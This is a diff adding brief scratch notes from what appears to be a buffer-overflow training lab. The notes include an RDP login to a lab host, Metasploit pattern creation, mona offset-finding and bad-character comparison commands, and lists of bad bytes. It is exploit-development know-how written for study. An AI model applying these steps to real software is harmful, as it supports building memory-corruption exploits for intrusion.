@@ -1,0 +1,23 @@
+
+xfreerdp /u:admin /p:password /cert:ignore /v:10.10.175.32 /workarea
+
+ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1600
+!mona findmsp -distance 1600
+
+
+
+
+
+!mona bytearray -b "\x00"
+
+019EFA30
+019CFA30
+!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
+
+
+ BadChars=00 04 3e 3f 40 e1
+
+
+ BadChars=00 04 05 3e 3f e1 e2
+\x00\x04\x3e\x3f\xe1
+
